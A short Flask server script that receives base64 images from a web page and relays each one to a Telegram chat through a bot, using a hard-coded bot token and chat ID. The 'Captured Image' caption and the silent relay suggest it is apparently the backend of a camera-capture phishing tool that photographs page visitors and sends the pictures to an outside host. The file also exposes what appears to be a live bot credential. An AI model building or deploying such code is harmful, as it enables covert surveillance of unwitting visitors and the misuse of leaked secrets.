from flask import Flask, render_template, request
import requests
import base64

app = Flask(__name__)


BOT_TOKEN = '7814534239:AAGnJLeWM_wDydzDX6OTldxxaHGk2xBscsY'
CHAT_ID = '7167361126'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    image_data = data.get('image')

    if image_data:
        
        img_bytes = base64.b64decode(image_data.split(',')[1])
        
        files = {'photo': ('image.jpg', img_bytes)}
        requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto',
            data={'chat_id': CHAT_ID, 'caption': '📸 Captured Image'},
            files=files
        )

    return {'status': 'success'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
